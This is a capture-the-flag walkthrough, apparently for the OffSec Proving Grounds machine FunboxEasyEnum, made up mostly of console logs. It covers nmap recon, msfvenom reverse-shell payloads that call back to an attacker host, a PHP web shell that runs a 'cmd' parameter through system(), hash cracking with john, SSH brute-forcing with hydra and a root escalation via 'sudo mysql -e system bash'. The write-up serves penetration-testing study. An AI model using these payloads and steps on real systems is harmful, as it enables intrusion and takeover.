# Recon

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# ping 192.168.111.132 -c 3
PING 192.168.111.132 (192.168.111.132) 56(84) bytes of data.
64 bytes from 192.168.111.132: icmp_seq=1 ttl=63 time=101 ms
64 bytes from 192.168.111.132: icmp_seq=2 ttl=63 time=103 ms
64 bytes from 192.168.111.132: icmp_seq=3 ttl=63 time=101 ms

--- 192.168.111.132 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 101.340/102.199/103.540/1.028 ms
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nmap -Pn -sT -sV -n 192.168.111.132 -p- --reason --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-30 11:18 CDT
Warning: 192.168.111.132 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.111.132
Host is up, received user-set (0.10s latency).
Not shown: 64595 closed ports, 938 filtered ports
Reason: 64595 conn-refused and 938 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.66 seconds

```

## HTTP TCP/80

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nmap -Pn -sT -sV --script=http-enum -n 192.168.111.132 -p 80
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-30 11:22 CDT
Nmap scan report for 192.168.111.132
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum: 
|   /robots.txt: Robots file
|_  /phpmyadmin/: phpMyAdmin
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.72 seconds
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum//img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# curl -i http://192.168.111.132/robots.txt
HTTP/1.1 200 OK
Date: Sat, 30 Oct 2021 16:24:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Fri, 18 Sep 2020 18:14:45 GMT
ETag: "15-5af9a79bf90d0"
Accept-Ranges: bytes
Content-Length: 21
Content-Type: text/plain

Allow: Enum_this_Box
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/2.png)

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# searchsploit Zerion
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# msfvenom -p php/reverse_php LHOST=192.168.49.111 LPORT=80 -f raw > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3023 bytes
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/6.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/7.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/8.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/9.png)

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.111] from (UNKNOWN) [192.168.111.132] 36654
whoami
www-data
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:4d:2b brd ff:ff:ff:ff:ff:ff
    inet 192.168.111.132/24 brd 192.168.111.255 scope global ens192
       valid_lft forever preferred_lft forever
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.111 LPORT=80 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nano myshell.php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/10.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/11.png)

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# curl -i http://192.168.111.132/myshell.php?cmd=./shell.elf
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.111] from (UNKNOWN) [192.168.111.132] 36942
whoami
www-data
```

```console
script /dev/null -c bash
Script started, file is /dev/null
www-data@funbox7:/var/www/html$ whoami
whoami
www-data
www-data@funbox7:/var/www/html$ 
www-data@funbox7:/var/www/html$ ^Z
[1]+  Detenido                nc -lvnp 80
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# stty raw -echo
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nc -lvnp 80
                                                       reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@funbox7:/var/www/html$ export TERM=xterm
www-data@funbox7:/var/www/html$ export SHELL=bash
www-data@funbox7:/var/www/html$ stty rows 23 columns 144
```

```console
www-data@funbox7:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
karla:x:1000:1000:karla:/home/karla:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
hiphop           (oracle)
1g 0:00:00:00 DONE (2021-10-30 12:28) 33.33g/s 12800p/s 12800c/s 12800C/s hiphop..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```console
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force
```

```console
www-data@funbox7:/home$ su oracle
Password: 
oracle@funbox7:/home$ whoami
oracle
```

```console
oracle@funbox7:~$ ifconfig 
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.111.132  netmask 255.255.255.0  broadcast 192.168.111.255
        ether 00:50:56:bf:4d:2b  txqueuelen 1000  (Ethernet)
        RX packets 1729425  bytes 146473269 (146.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1185276  bytes 200995893 (200.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4123  bytes 393896 (393.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4123  bytes 393896 (393.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

oracle@funbox7:~$ 
```

```console
oracle@funbox7:/var/www$ cat local.txt 
3d5c97bc66afa1832589164343f52892
```

# Privilege escalation

```console
oracle@funbox7:/var/www$ sudo -l
[sudo] password for oracle: 
Sorry, user oracle may not run sudo on funbox7.
```

```console
oracle@funbox7:/var/www$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/umount
/usr/bin/at
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
```

```console
oracle@funbox7:/var/mail$ cat /etc/passwd | cut -d ':' -f 1,7 | grep "bash\|sh" | grep -v "sshd"
root:/bin/bash
karla:/bin/bash
harry:/bin/bash
sally:/bin/bash
goat:/bin/bash
oracle:/bin/bash
lissy:/bin/sh
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# hydra -l goat -P /usr/share/wordlists/rockyou.txt 192.168.111.132 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-30 12:50:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task
[DATA] attacking ssh://192.168.111.132:22/
[STATUS] 261.00 tries/min, 261 tries in 00:00h, 0 to do in 01:00h, 14344143 active
[STATUS] 223.00 tries/min, 669 tries in 00:00h, 0 to do in 03:00h, 14343735 active
[STATUS] 225.86 tries/min, 1581 tries in 00:00h, 0 to do in 07:00h, 14342823 active
[22][ssh] host: 192.168.111.132   login: goat   password: goat
1 of 1 target successfully completed, 1 valid password found
```

```console
www-data@funbox7:/home$ su goat
Password: 
goat@funbox7:/home$ sudo -l
Matching Defaults entries for goat on funbox7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goat may run the following commands on funbox7:
    (root) NOPASSWD: /usr/bin/mysql
goat@funbox7:/home$ sudo /usr/bin/mysql -e 'system bash'
root@funbox7:/home# whoami
root
```

```console
root@funbox7:/home# cd /root
root@funbox7:/root# ls
proof.txt  root.flag
root@funbox7:/root# cat proof.txt 
3cf49e852c9c04d60820068da9f07747
```
